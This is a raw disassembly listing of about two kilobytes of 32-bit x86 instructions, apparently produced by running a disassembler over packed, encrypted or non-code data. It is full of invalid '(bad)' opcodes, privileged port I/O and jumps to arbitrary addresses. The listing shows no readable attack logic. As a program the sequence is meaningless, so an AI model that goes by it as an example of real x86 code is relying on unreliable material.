  40b61f:	cli    
  40b620:	outs   dx,DWORD PTR ds:[esi]
  40b621:	call   0x3d10:0xebaa267c
  40b628:	in     al,0xe8
  40b62a:	xchg   ebx,eax
  40b62b:	dec    esp
  40b62c:	sahf   
  40b62d:	popa   
  40b62e:	enter  0xe40f,0x6b
  40b632:	jl     0x40b62b
  40b634:	addr16 mov ds:0x972e,al
  40b638:	push   ebp
  40b639:	sbb    BYTE PTR [ebp+ecx*2+0x8435c75],ah
  40b640:	jg     0x40b606
  40b642:	push   ebx
  40b643:	arpl   WORD PTR [edi],dx
  40b645:	pop    ecx
  40b646:	dec    eax
  40b647:	lods   eax,DWORD PTR ds:[esi]
  40b648:	ss pop ecx
  40b64a:	dec    esi
  40b64b:	lds    esi,FWORD PTR [ebx]
  40b64d:	inc    eax
  40b64e:	sub    al,0x75
  40b650:	jns    0x40b6c7
  40b652:	mov    eax,0xa40ad614
  40b657:	mov    ch,0x6a
  40b659:	fld    DWORD PTR [ebx-0x57]
  40b65c:	mov    ah,0xa2
  40b65e:	sbb    al,0x16
  40b660:	es push eax
  40b662:	test   al,0x78
  40b664:	loope  0x40b663
  40b666:	out    dx,eax
  40b667:	mov    ds:0x20181e2,al
  40b66c:	fmul   st,st(5)
  40b66e:	mov    eax,ds:0xd6e208aa
  40b673:	xchg   DWORD PTR [esi-0x4f2ac139],esp
  40b679:	inc    esi
  40b67a:	test   eax,0x77671050
  40b67f:	or     DWORD PTR [edx+0x2d],0xaaf641a3
  40b686:	inc    ebp
  40b687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b688:	pop    esp
  40b689:	cmc    
  40b68a:	ret    0x684b
  40b68d:	mov    al,0xe4
  40b68f:	call   0xd8a0eaa2
  40b694:	into   
  40b695:	or     al,0xe5
  40b697:	ins    DWORD PTR es:[edi],dx
  40b698:	enter  0x85d1,0x3d
  40b69c:	fwait
  40b69d:	sar    ecx,cl
  40b69f:	inc    edx
  40b6a0:	xor    DWORD PTR [ebx+eax*2-0x39],ecx
  40b6a4:	cmp    al,0xea
  40b6a6:	sbb    BYTE PTR [esi],bl
  40b6a8:	jp     0x40b6a7
  40b6aa:	repnz adc ax,WORD PTR [ebx+0x5196648a]
  40b6b2:	jbe    0x40b647
  40b6b4:	add    esp,ebp
  40b6b6:	lds    ebp,FWORD PTR [esp+ecx*8+0x70b117e5]
  40b6bd:	sbb    al,0xf
  40b6bf:	adc    al,0x7b
  40b6c1:	retf   
  40b6c2:	jo     0x40b687
  40b6c4:	mov    bl,0x32
  40b6c6:	je     0x40b6ef
  40b6c8:	sbb    BYTE PTR ds:0x3f4c0433,ch
  40b6ce:	int    0x16
  40b6d0:	imul   BYTE PTR [ecx-0x23]
  40b6d3:	sub    BYTE PTR ds:0xdfe0771f,bl
  40b6d9:	adc    bh,BYTE PTR ds:0xca281dbd
  40b6df:	icebp  
  40b6e0:	mov    eax,0x30defdd2
  40b6e5:	xor    ch,bh
  40b6e7:	rol    eax,1
  40b6e9:	mov    DWORD PTR [edx+0x59],ebp
  40b6ec:	jmp    0xfe9a0b60
  40b6f1:	out    0x35,eax
  40b6f3:	mov    ah,0xcc
  40b6f5:	ins    DWORD PTR es:[edi],dx
  40b6f6:	pushf  
  40b6f7:	or     esi,ecx
  40b6f9:	lods   al,BYTE PTR ds:[esi]
  40b6fa:	dec    eax
  40b6fb:	out    0x3d,eax
  40b6fd:	xchg   ebp,eax
  40b6fe:	(bad)  
  40b6ff:	(bad)  
  40b700:	and    al,BYTE PTR [esi+0x2b17a5e4]
  40b706:	or     BYTE PTR [ecx-0x5e],cl
  40b709:	pop    edx
  40b70a:	mov    edi,0x7099f865
  40b70f:	lock hlt 
  40b711:	(bad)  
  40b712:	lods   al,BYTE PTR ds:[esi]
  40b713:	mov    BYTE PTR [esi-0x29fc0848],bh
  40b719:	add    ah,BYTE PTR [ebx-0x42]
  40b71c:	ss xor ecx,ebx
  40b71f:	leave  
  40b720:	sbb    eax,DWORD PTR [ecx]
  40b722:	outs   dx,DWORD PTR ds:[esi]
  40b723:	jno    0x40b79c
  40b725:	mov    ds:0xf7c671c3,al
  40b72a:	fcom   QWORD PTR [eax-0x14]
  40b72d:	push   ebx
  40b72e:	test   al,0xe5
  40b730:	xor    BYTE PTR [ebp-0x15771773],cl
  40b736:	pop    ss
  40b737:	dec    esp
  40b738:	or     BYTE PTR [edi],0x2d
  40b73b:	loop   0x40b766
  40b73d:	in     eax,0x99
  40b73f:	fcom   QWORD PTR [ebp+ebp*8+0x17]
  40b743:	sbb    DWORD PTR [edi],eax
  40b745:	and    DWORD PTR [ebp+0x6],0xc4e1e674
  40b74c:	pushf  
  40b74d:	out    0x43,eax
  40b74f:	aad    0x4a
  40b751:	mov    ecx,0xab7c4ce1
  40b756:	les    eax,FWORD PTR [edx+0x7b]
  40b759:	cmp    BYTE PTR [esi],bh
  40b75b:	ss pusha 
  40b75d:	cmp    eax,0x332ff92d
  40b762:	fdiv   QWORD PTR [ebx+0x29c18972]
  40b768:	push   esp
  40b769:	sub    al,0x64
  40b76b:	xor    eax,0x9b9932a
  40b770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b771:	add    ebp,DWORD PTR [edi+0x54]
  40b774:	lds    edx,FWORD PTR [ecx]
  40b776:	repnz mov ah,0xee
  40b779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b77a:	fwait
  40b77b:	loopne 0x40b72d
  40b77d:	jecxz  0x40b79a
  40b77f:	push   ss
  40b780:	jle    0x40b79d
  40b782:	inc    edx
  40b783:	inc    esi
  40b784:	fnsave [edi-0x6ea95be0]
  40b78a:	push   0x36
  40b78c:	loope  0x40b7bf
  40b78e:	callw  0x7e0d
  40b792:	xor    BYTE PTR [edx+0x52b2183e],0x1e
  40b799:	mov    edi,0xa5de2b24
  40b79e:	fnstcw WORD PTR [edi-0x6]
  40b7a1:	and    ecx,DWORD PTR [eax-0x3b]
  40b7a4:	push   ecx
  40b7a5:	inc    ecx
  40b7a6:	mul    BYTE PTR [esi+ebx*2+0x36]
  40b7aa:	fisttp DWORD PTR [ecx-0x2a]
  40b7ad:	jmp    0xefa2beb6
  40b7b2:	cmp    dl,dh
  40b7b4:	fs push esp
  40b7b6:	sbb    esi,ecx
  40b7b8:	(bad)  
  40b7b9:	rcl    BYTE PTR [edi],cl
  40b7bb:	push   0x4b
  40b7bd:	push   es
  40b7be:	sti    
  40b7bf:	push   ebx
  40b7c1:	xor    al,dl
  40b7c3:	add    eax,0xf424c2d4
  40b7c8:	ret    
  40b7c9:	and    eax,0xb9b2072f
  40b7ce:	dec    ebp
  40b7cf:	ins    BYTE PTR es:[edi],dx
  40b7d0:	pop    ebp
  40b7d1:	adc    eax,DWORD PTR [eax-0x4988cddc]
  40b7d7:	push   ebp
  40b7d8:	pop    ss
  40b7d9:	cvtdq2ps xmm3,XMMWORD PTR [ebp+0x7d88ef7f]
  40b7e0:	xchg   ebx,eax
  40b7e1:	push   ecx
  40b7e2:	(bad)  
  40b7e3:	mov    WORD PTR [esi-0x31635bf9],gs
  40b7e9:	jmp    0x3a38084b
  40b7ee:	rcr    BYTE PTR [ebp-0xc],1
  40b7f1:	dec    ecx
  40b7f2:	push   ebp
  40b7f3:	push   0xffffff86
  40b7f5:	push   eax
  40b7f6:	or     eax,0xf45a6da7
  40b7fb:	xchg   edx,eax
  40b7fc:	paddq  mm1,mm3
  40b7ff:	pop    ds
  40b800:	jo     0x40b80b
  40b802:	xchg   esi,eax
  40b803:	cwde   
  40b804:	sar    BYTE PTR [edi+0x24],cl
  40b807:	adc    BYTE PTR [esi-0x1a34dfdd],bl
  40b80d:	mov    cl,0xa2
  40b80f:	fimul  WORD PTR [ecx+ebx*4]
  40b812:	(bad)  [ecx]
  40b814:	ss and eax,0xa7aba06e
  40b81a:	push   0xda7b91bc
  40b81f:	test   BYTE PTR [eax+0x5e],0x8d
  40b823:	ret    0x5c80
  40b826:	and    ch,BYTE PTR [ebp-0x57f5f3a8]
  40b82c:	mov    al,ds:0x1e3484c8
  40b831:	or     eax,0xe0c8faf9
  40b836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b837:	push   ds
  40b838:	inc    esi
  40b839:	jle    0x40b833
  40b83b:	push   eax
  40b83c:	iret   
  40b83d:	xchg   edi,eax
  40b83e:	js     0x40b872
  40b840:	clc    
  40b841:	aad    0xd
  40b843:	mov    al,ds:0xda3f978d
  40b848:	push   edx
  40b849:	sub    DWORD PTR [edx+0x53],edx
  40b84c:	(bad)  
  40b84d:	jmp    0xee43:0x6e966973
  40b854:	sub    DWORD PTR [edi+0x5c17c724],esi
  40b85a:	push   ds
  40b85b:	arpl   WORD PTR [edx+0x4b66995e],bp
  40b861:	mov    esp,0x2a31858b
  40b866:	loop   0x40b8a9
  40b868:	dec    ecx
  40b869:	clc    
  40b86a:	sbb    BYTE PTR [ebx-0x4b],dh
  40b86d:	aas    
  40b86e:	cs pop eax
  40b870:	dec    edi
  40b871:	out    0xc8,al
  40b873:	pushf  
  40b874:	arpl   di,sp
  40b876:	js     0x40b88f
  40b878:	pavgb  mm7,mm0
  40b87b:	and    al,0x95
  40b87d:	out    dx,eax
  40b87e:	jg     0x40b8db
  40b880:	xor    DWORD PTR [edi+ecx*8+0x3e062380],ebp
  40b887:	or     ah,bh
  40b889:	leave  
  40b88a:	mov    BYTE PTR [ecx-0x6b],al
  40b88d:	push   edx
  40b88e:	cmc    
  40b88f:	add    BYTE PTR es:[ecx],bh
  40b892:	clc    
  40b893:	test   BYTE PTR [esp+edx*2],ch
  40b896:	aaa    
  40b897:	out    0xa4,al
  40b899:	adc    DWORD PTR [ecx-0xf],eax
  40b89c:	cmp    eax,0x436753c9
  40b8a1:	fdivrp st(0),st
  40b8a3:	sbb    eax,0x2f8b4005
  40b8a8:	popf   
  40b8a9:	jne    0x40b86b
  40b8ab:	cmp    bh,BYTE PTR [ebp+0x28]
  40b8ae:	or     esi,DWORD PTR [esi+0x51d675a5]
  40b8b4:	mov    fs,WORD PTR [eax+0x1f79337f]
  40b8ba:	std    
  40b8bb:	imul   eax,DWORD PTR ds:0xc2066885,0xffffffc2
  40b8c2:	in     al,0xbc
  40b8c4:	mov    edi,0xf7311e5f
  40b8c9:	xchg   ebp,eax
  40b8ca:	inc    esp
  40b8cb:	push   ebp
  40b8cc:	push   eax
  40b8cd:	mov    DWORD PTR [eax+edi*1-0x68],ebp
  40b8d1:	and    BYTE PTR [ebp-0x30],cl
  40b8d4:	push   0x8a7c5eef
  40b8d9:	je     0x40b932
  40b8db:	add    DWORD PTR [esi],edi
  40b8dd:	mov    al,0x23
  40b8df:	jmp    0x5d42:0x4fb624cf
  40b8e6:	fist   WORD PTR [edx+ebx*1]
  40b8e9:	(bad)  
  40b8ea:	out    0xb1,eax
  40b8ec:	daa    
  40b8ed:	mov    eax,ds:0x8594a1bb
  40b8f2:	mov    edx,0xeba34924
  40b8f7:	int    0x7a
  40b8f9:	adc    bh,BYTE PTR [ebx+0x27626136]
  40b8ff:	xchg   edi,eax
  40b900:	xor    BYTE PTR [edx-0x46ac4b6e],ah
  40b906:	add    edi,esi
  40b908:	add    BYTE PTR [edi+eiz*2-0x76a3f4c6],dh
  40b90f:	(bad)  [ebp+0x19]
  40b912:	sub    dh,BYTE PTR [eax]
  40b914:	in     al,0xb1
  40b916:	out    0x55,eax
  40b918:	(bad)  
  40b919:	xor    DWORD PTR [edx+0x47],ebx
  40b91c:	outs   dx,BYTE PTR ds:[esi]
  40b91d:	jp     0x40b922
  40b91f:	mov    cl,ch
  40b921:	loopne 0x40b953
  40b923:	inc    ebx
  40b924:	mov    edx,0x507fdd07
  40b929:	add    DWORD PTR [ecx+0x6c608327],0x45
  40b930:	clc    
  40b931:	out    0x34,eax
  40b933:	in     eax,0xa0
  40b935:	pop    eax
  40b936:	pop    esp
  40b937:	rcr    DWORD PTR [ebp+0x5b],1
  40b93a:	pop    eax
  40b93c:	fsubr  DWORD PTR [esi]
  40b93e:	dec    ebx
  40b93f:	(bad)
  40b942:	sbb    eax,0x34135417
  40b947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b948:	xchg   ebp,eax
  40b949:	pop    ss
  40b94a:	fbld   TBYTE PTR [eax-0x13]
  40b94d:	mov    bl,0x5d
  40b94f:	xchg   ebx,eax
  40b950:	fild   DWORD PTR [edi+0x4c67a256]
  40b956:	mov    cl,0xfa
  40b958:	ret    
  40b959:	lahf   
  40b95a:	and    esi,DWORD PTR [ebp+0x61]
  40b95d:	(bad)  
  40b95e:	ds stc 
  40b960:	fdiv   DWORD PTR [ecx+0x5f375e27]
  40b966:	ins    BYTE PTR es:[edi],dx
  40b967:	mov    ecx,cs
  40b969:	pop    eax
  40b96a:	cwde   
  40b96b:	push   cs
  40b96c:	sub    bl,dl
  40b96e:	fwait
  40b96f:	pushf  
  40b970:	loope  0x40b997
  40b972:	and    esp,eax
  40b974:	rol    BYTE PTR [edi+0x5b],1
  40b977:	sub    bl,BYTE PTR [edx-0x13]
  40b97a:	adc    DWORD PTR [ecx],esi
  40b97c:	lds    eax,FWORD PTR [edi]
  40b97e:	out    0xa5,al
  40b980:	daa    
  40b981:	inc    esp
  40b982:	pop    esi
  40b983:	loopne 0x40b935
  40b985:	xor    bh,BYTE PTR [eax+0x77]
  40b988:	sbb    BYTE PTR [ebx+0x59df5203],0x50
  40b98f:	(bad)  
  40b991:	leave  
  40b992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b993:	lods   eax,DWORD PTR ds:[esi]
  40b994:	sbb    DWORD PTR [ebx+0x2b25e794],edi
  40b99a:	(bad)  
  40b99b:	nop
  40b99c:	jne    0x40b9f6
  40b99e:	gs mov edi,0x5aae66b8
  40b9a4:	add    ebp,DWORD PTR [esi-0x1d31135a]
  40b9aa:	test   BYTE PTR [eax-0x90601a3],bl
  40b9b0:	mov    esp,gs
  40b9b2:	aas    
  40b9b3:	sub    DWORD PTR [edi-0x4b70f14e],ecx
  40b9b9:	scas   al,BYTE PTR es:[edi]
  40b9ba:	popf   
  40b9bb:	jmp    0x40b9b7
  40b9bd:	pushf  
  40b9be:	ret    
  40b9bf:	call   0x67cc:0xb0ec322a
  40b9c6:	stos   BYTE PTR es:[edi],al
  40b9c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9c8:	aas    
  40b9c9:	arpl   dx,si
  40b9cb:	dec    ecx
  40b9cc:	fnstcw WORD PTR [ebx]
  40b9ce:	push   esi
  40b9cf:	adc    dh,BYTE PTR [ebx-0x1]
  40b9d2:	mov    WORD PTR [ecx-0x2410cecf],?
  40b9d8:	mov    dh,0x2c
  40b9da:	in     eax,dx
  40b9db:	mov    eax,ds:0xd93457af
  40b9e0:	mov    eax,ds:0xc8fb89d3
  40b9e5:	scas   eax,DWORD PTR es:[edi]
  40b9e6:	adc    DWORD PTR [ebx-0x4be80a26],ebx
  40b9ec:	pop    ebp
  40b9ed:	or     BYTE PTR [ecx-0x7b23b3d1],dl
  40b9f3:	and    edx,ebp
  40b9f5:	cwde   
  40b9f6:	sbb    BYTE PTR [ecx],al
  40b9f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9f9:	(bad)  
  40b9fa:	xor    dh,0x8a
  40b9fd:	repnz hlt 
  40b9ff:	aas    
  40ba00:	sbb    ah,BYTE PTR [ebx-0x2c]
  40ba03:	popa   
  40ba04:	jmp    DWORD PTR [edx]
  40ba06:	bound  esp,QWORD PTR [eax]
  40ba08:	scas   eax,DWORD PTR es:[edi]
  40ba09:	pop    esp
  40ba0a:	adc    al,0x60
  40ba0c:	clc    
  40ba0d:	bound  esi,QWORD PTR [esi-0x44f6a2c4]
  40ba13:	out    0xb3,eax
  40ba15:	lock js 0x40ba2e
  40ba18:	push   ds
  40ba19:	or     ch,bh
  40ba1b:	cmp    dl,BYTE PTR [esi]
  40ba1d:	(bad)  
  40ba1e:	or     esi,ebp
  40ba20:	mov    al,ds:0xad2e6dcc
  40ba25:	je     0x40b9d5
  40ba27:	sub    al,0xa1
  40ba29:	ficomp DWORD PTR [ebp+0x2bfde025]
  40ba2f:	adc    dl,bh
  40ba31:	ss stos BYTE PTR es:[edi],al
  40ba33:	push   0xffffffa0
  40ba35:	or     eax,0xd5a77a04
  40ba3a:	(bad)  
  40ba3b:	(bad)  
  40ba3d:	fs in  al,dx
  40ba3f:	sti    
  40ba40:	and    eax,0x28cfee8c
  40ba45:	popa   
  40ba46:	jb     0x40b9e8
  40ba48:	mov    cl,al
  40ba4a:	sub    edx,eax
  40ba4c:	daa    
  40ba4d:	mov    WORD PTR [edi+ebx*4],ss
  40ba50:	sub    DWORD PTR [eax],0xffffff93
  40ba53:	or     edi,DWORD PTR [edi-0x58]
  40ba56:	in     al,dx
  40ba57:	pop    edx
  40ba58:	aas    
  40ba59:	jge    0x40b9f2
  40ba5b:	inc    esp
  40ba5c:	les    ecx,FWORD PTR [eax]
  40ba5e:	leave  
  40ba5f:	ja     0x40bacb
  40ba61:	mov    al,ds:0xa4fb961c
  40ba66:	and    BYTE PTR [ebx],cl
  40ba68:	stc    
  40ba69:	jge    0x40ba47
  40ba6b:	ret    
  40ba6c:	or     ah,bl
  40ba6e:	data16 jp 0x40b9f8
  40ba71:	jmp    0x73560a46
  40ba76:	scas   al,BYTE PTR es:[edi]
  40ba77:	fild   QWORD PTR [ebx]
  40ba79:	call   DWORD PTR [ebx-0x24]
  40ba7c:	jp     0x40ba17
  40ba7e:	fisub  DWORD PTR [ecx-0x1d]
  40ba81:	lods   al,BYTE PTR ds:[esi]
  40ba82:	pusha  
  40ba83:	pop    eax
  40ba84:	jbe    0x40ba2b
  40ba86:	imul   BYTE PTR [esi-0x79c094c0]
  40ba8c:	push   edi
  40ba8d:	mov    cl,0x31
  40ba8f:	mov    eax,ds:0x665298d9
  40ba94:	div    dl
  40ba96:	fisubr WORD PTR [edi]
  40ba98:	xchg   ebx,eax
  40ba99:	cmp    al,0x2f
  40ba9b:	retf   0xda40
  40ba9e:	sbb    al,0xf7
  40baa0:	pop    esp
  40baa1:	push   esp
  40baa2:	sti    
  40baa3:	and    ch,cl
  40baa5:	repnz mov bh,0xf0
  40baa8:	imul   DWORD PTR [eax+0x7c]
  40baab:	fsubr  QWORD PTR [ebx]
  40baad:	stos   DWORD PTR es:[edi],eax
  40baae:	inc    esi
  40baaf:	push   edi
  40bab0:	test   al,bh
  40bab2:	pop    eax
  40bab3:	loop   0x40ba9a
  40bab5:	inc    ebx
  40bab6:	dec    edx
  40bab7:	push   0x68
  40bab9:	mov    bh,0x2
  40babb:	gs (bad) 
  40babd:	xor    BYTE PTR ds:0x88730b98,ah
  40bac3:	mov    eax,ds:0xa8b8ba8b
  40bac8:	cmp    bh,BYTE PTR [eax+0x1d626125]
  40bace:	push   edx
  40bacf:	pop    es
  40bad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bad1:	scas   eax,DWORD PTR es:[edi]
  40bad2:	add    BYTE PTR [eax+0x7c],al
  40bad5:	stc    
  40bad6:	push   es
  40bad7:	add    DWORD PTR [esi-0x50],0x7a84634f
  40bade:	inc    esp
  40badf:	mov    al,0xfd
  40bae1:	test   eax,0x422f41ce
  40bae6:	aam    0x67
  40bae8:	ins    BYTE PTR es:[edi],dx
  40bae9:	sub    DWORD PTR [edi-0x3f19eb27],esp
  40baef:	sar    BYTE PTR [ebx],0xd6
  40baf2:	cmp    eax,0x4c6b1b6f
  40baf7:	cld    
  40baf8:	xchg   edx,eax
  40baf9:	jnp    0x40bac4
  40bafb:	cdq    
  40bafc:	stos   DWORD PTR es:[edi],eax
  40bafd:	fist   DWORD PTR [ecx]
  40baff:	into   
  40bb00:	outs   dx,DWORD PTR ds:[esi]
  40bb01:	fwait
  40bb02:	pop    ss
  40bb03:	movlps xmm1,QWORD PTR [ebx+0x75]
  40bb07:	call   DWORD PTR [edx+ebp*1+0x4c46613]
  40bb0e:	sbb    bl,BYTE PTR [esi]
  40bb10:	movq   mm4,QWORD PTR [eax+0x18ab820]
  40bb17:	mov    ecx,0x868a5fc
  40bb1c:	sbb    bh,BYTE PTR [esi]
  40bb1e:	outs   dx,DWORD PTR ds:[esi]
  40bb1f:	sti    
  40bb20:	inc    eax
  40bb21:	mov    WORD PTR [ebx-0x45a6e866],?
  40bb27:	and    eax,0xd2a09b18
  40bb2c:	inc    esp
  40bb2d:	fist   DWORD PTR [ebx-0x6f]
  40bb30:	into   
  40bb31:	pop    esp
  40bb32:	add    esi,edi
  40bb34:	or     eax,0xe6d2490f
  40bb39:	pop    esi
  40bb3a:	aam    0x2d
  40bb3c:	sub    cl,BYTE PTR [edi-0x2b]
  40bb3f:	retf   0x178e
  40bb42:	dec    edx
  40bb43:	inc    ebp
  40bb44:	adc    eax,0xf60221c0
  40bb49:	pop    es
  40bb4a:	inc    eax
  40bb4b:	inc    ebp
  40bb4c:	mov    DWORD PTR [edi+0x310b3928],esi
  40bb52:	sub    BYTE PTR [di-0x3f],ch
  40bb56:	retf   
  40bb57:	xor    ebx,DWORD PTR cs:[eax+0x26]
  40bb5b:	xor    ch,bh
  40bb5d:	in     al,0xbb
  40bb5f:	mov    esi,0x8a28f4c1
  40bb64:	mov    eax,ds:0x80ce6d2b
  40bb69:	mov    edx,0x62085f86
  40bb6e:	xor    al,0x3c
  40bb70:	inc    eax
  40bb71:	fsub   DWORD PTR [esi]
  40bb73:	push   cs
  40bb74:	aaa    
  40bb75:	data16 adc al,0x1e
  40bb78:	inc    edi
  40bb79:	jae    0x40bb1c
  40bb7b:	jns    0x40bb77
  40bb7d:	and    eax,0xe9ba99f2
  40bb82:	jp     0x40bbd8
  40bb84:	push   cs
  40bb85:	sub    eax,0x1674d2d5
  40bb8a:	push   esi
  40bb8b:	fdivrp st(0),st
  40bb8d:	xchg   edx,eax
  40bb8e:	cld    
  40bb8f:	pop    ss
  40bb90:	(bad)  
  40bb92:	loop   0x40bbe1
  40bb94:	in     al,0x41
  40bb96:	mov    edi,0x9bbd5b61
  40bb9b:	ins    DWORD PTR es:[edi],dx
  40bb9c:	jno    0x40bbe2
  40bb9e:	ret    0x9ccb
  40bba1:	xchg   edx,eax
  40bba2:	jo     0x40bbf4
  40bba4:	test   eax,0x7364bdcf
  40bba9:	pop    eax
  40bbaa:	cmp    al,ch
  40bbac:	jae    0x40bc17
  40bbae:	jo     0x40bb51
  40bbb0:	mov    ecx,0x16e33d54
  40bbb5:	mov    al,cl
  40bbb7:	dec    edi
  40bbb8:	dec    ecx
  40bbb9:	push   esp
  40bbba:	gs (bad) 
  40bbbc:	sub    edi,edx
  40bbbe:	outs   dx,DWORD PTR ds:[esi]
  40bbbf:	leave  
  40bbc0:	push   edx
  40bbc1:	data16 xor BYTE PTR [edx-0x3624ce7a],cl
  40bbc8:	aaa    
  40bbc9:	retf   
  40bbca:	jg     0x40bb68
  40bbcc:	jo     0x40bb64
  40bbce:	sub    al,0x7b
  40bbd0:	ins    DWORD PTR es:[edi],dx
  40bbd1:	cmp    bl,bh
  40bbd3:	and    BYTE PTR [edi+0xbdd1b62],cl
  40bbd9:	push   edi
  40bbda:	int3   
  40bbdb:	mov    al,0xf4
  40bbdd:	ss mov bl,0x5e
  40bbe0:	pop    esp
  40bbe1:	loope  0x40bc25
  40bbe3:	inc    eax
  40bbe4:	and    eax,0x735b9759
  40bbe9:	fwait
  40bbea:	mov    al,0x2d
  40bbec:	data16 popw es
  40bbef:	(bad)  
  40bbf0:	jmp    0x40bba0
  40bbf2:	repnz into 
  40bbf4:	dec    DWORD PTR [ebx]
  40bbf6:	pop    ss
  40bbf7:	into   
  40bbf8:	inc    esi
  40bbf9:	out    dx,eax
  40bbfa:	popf   
  40bbfb:	cli    
  40bbfc:	call   0x8311ee52
  40bc01:	add    esp,esp
  40bc03:	dec    ah
  40bc05:	cmp    bl,cl
  40bc07:	scas   al,BYTE PTR es:[edi]
  40bc08:	pushf  
  40bc09:	jnp    0x40bb98
  40bc0b:	pop    es
  40bc0c:	sub    dh,al
  40bc0e:	call   0x3f69:0x8fb7311c
  40bc15:	repz push 0x61
  40bc18:	cmc    
  40bc19:	pop    eax
  40bc1a:	inc    esi
  40bc1b:	xchg   esi,eax
  40bc1c:	xor    dl,BYTE PTR [edi+ebx*2]
  40bc1f:	and    esi,DWORD PTR [esi]
  40bc21:	shr    BYTE PTR [edi],0x38
  40bc24:	mov    al,0xb2
  40bc26:	mov    eax,0xffd076c5
  40bc2b:	pop    esi
  40bc2c:	inc    esp
  40bc2e:	mov    BYTE PTR [bx+si-0x7a64],ch
  40bc33:	(bad)  
  40bc35:	retf   
  40bc36:	stos   BYTE PTR es:[edi],al
  40bc37:	stos   DWORD PTR es:[edi],eax
  40bc38:	or     eax,0xa63230df
  40bc3d:	test   eax,0xeef5a747
  40bc42:	xchg   DWORD PTR [esi+0x9b8ab7e],ebx
  40bc48:	mov    ecx,cr1
  40bc4b:	test   al,0xc5
  40bc4d:	sub    BYTE PTR [edx-0x4a057882],al
  40bc53:	bound  ebx,QWORD PTR [ebx+ebp*2-0x34]
  40bc57:	pop    es
  40bc58:	xor    dl,BYTE PTR [ecx+0x24b0665e]
  40bc5e:	xor    cl,BYTE PTR [edi+0x4f06d561]
  40bc64:	add    al,0x55
  40bc66:	loopne 0x40bbf8
  40bc68:	add    eax,0x2b4a844d
  40bc6d:	cmp    al,0xff
  40bc6f:	xchg   ecx,eax
  40bc70:	adc    edx,eax
  40bc72:	lahf   
  40bc73:	add    eax,0x3a96a47a
  40bc78:	jl     0x40bc75
  40bc7a:	das    
  40bc7b:	jnp    0x40bc10
  40bc7d:	xchg   ch,al
  40bc7f:	fwait
  40bc80:	or     eax,0xc646e4f6
  40bc85:	popa   
  40bc86:	lea    ebp,[eax]
  40bc88:	dec    ecx
  40bc89:	mov    edi,0x113cfe0a
  40bc8e:	or     DWORD PTR fs:[esi+0x7fc2ebbe],edx
  40bc95:	call   0x0:0xc6
	...
  40bd14:	pop    edx
  40bd15:	in     al,0xf9
  40bd17:	(bad)  
  40bd18:	(bad)  
  40bd19:	fnstsw WORD PTR [edi-0x2]
  40bd1c:	or     eax,0xd64271cc
  40bd21:	push   ecx
  40bd22:	push   esp
  40bd23:	out    0x94,al
  40bd25:	ins    DWORD PTR es:[edi],dx
  40bd26:	add    BYTE PTR [eax],al
  40bd28:	imul   eax,DWORD PTR [edi],0x0
  40bd2b:	add    BYTE PTR [ebp+0x50b956e6],cl
  40bd31:	dec    ebx
  40bd32:	(bad)  
  40bd34:	enter  0x6f08,0x3c
  40bd38:	sbb    al,0xfc
  40bd3a:	inc    edi
  40bd3b:	mov    ds:0x9a38b1e4,eax
  40bd40:	fstp   TBYTE PTR [ecx+ecx*1-0x3342093]
  40bd47:	pusha  
  40bd48:	scas   al,BYTE PTR es:[edi]
  40bd49:	xlat   BYTE PTR ds:[ebx]
  40bd4a:	jmp    0x40bd58
  40bd4c:	leave  
  40bd4d:	mov    ds:0xed954f4e,eax
  40bd52:	cmp    DWORD PTR [edx],edi
  40bd54:	adc    al,bh
  40bd56:	jne    0x40bd3a
  40bd58:	lods   al,BYTE PTR ds:[esi]
  40bd59:	mov    ah,0xba
  40bd5b:	adc    al,0x54
  40bd5d:	(bad)  
  40bd5e:	mov    ch,BYTE PTR [ebp+eax*8-0x62d56174]
  40bd65:	popf   
  40bd66:	pop    esi
  40bd67:	mov    edi,0x6c38153e
  40bd6c:	jb     0x40bd78
  40bd6e:	dec    esi
  40bd6f:	das    
  40bd70:	sbb    ch,ah
  40bd72:	mov    cl,0x2a
  40bd74:	jp     0x40bdd4
  40bd76:	push   ds
  40bd77:	mov    BYTE PTR [edx],bl
  40bd79:	pop    ss
  40bd7a:	js     0x40bd3f
  40bd7c:	nop
  40bd7d:	cli    
  40bd7e:	xor    bh,ah
  40bd80:	inc    ebx
  40bd81:	or     bl,BYTE PTR [ecx]
  40bd83:	das    
  40bd84:	push   edi
  40bd85:	aas    
  40bd86:	sbb    eax,0x11e0525a
  40bd8b:	mov    ds:0x9953c14d,eax
  40bd90:	lock mov ds:0xce96f7bc,eax
  40bd96:	or     dl,cl
  40bd98:	pop    esi
  40bd99:	or     eax,0xe3e858cf
  40bd9e:	sub    esp,DWORD PTR [ebp-0x60d2cc94]
  40bda4:	scas   al,BYTE PTR es:[edi]
  40bda5:	adc    edi,DWORD PTR [esp+ebp*1-0x52]
  40bda9:	pop    edi
  40bdaa:	sbb    al,0x8a
  40bdac:	stos   BYTE PTR es:[edi],al
  40bdad:	and    eax,0xebaf9eda
  40bdb2:	popa   
  40bdb3:	out    dx,eax
  40bdb4:	sbb    al,dl
  40bdb6:	mov    esp,0x5417195a
  40bdbb:	jl     0x40bd6c
  40bdbd:	test   BYTE PTR [edx-0x1b2d9f96],cl
  40bdc3:	dec    ebp
  40bdc4:	or     DWORD PTR [ebx],ecx
  40bdc6:	mov    ah,0xa
  40bdc8:	les    esi,FWORD PTR [ebx+0x54c6769d]
  40bdce:	jp     0x40bd60
  40bdd0:	mov    ebp,0xbcb9bbff
  40bdd5:	push   0x51391867
  40bdda:	in     eax,dx
  40bddb:	mov    edi,DWORD PTR [edx-0x4cb059de]
  40bde1:	pushf  
  40bde2:	xor    eax,ebx
  40bde4:	inc    edi
  40bde5:	xor    DWORD PTR [ebp+0x46],esi
  40bde8:	test   al,0xc6
  40bdea:	lea    edi,[edx-0x4a]
  40bded:	fmul   st(6),st
  40bdef:	pop    ds
  40bdf0:	in     al,dx
  40bdf1:	mov    bh,0xa8
  40bdf3:	sbb    esp,DWORD PTR [ecx+0x6c]
  40bdf6:	loope  0x40bdd3
  40bdf8:	out    0x98,eax
  40bdfa:	fwait
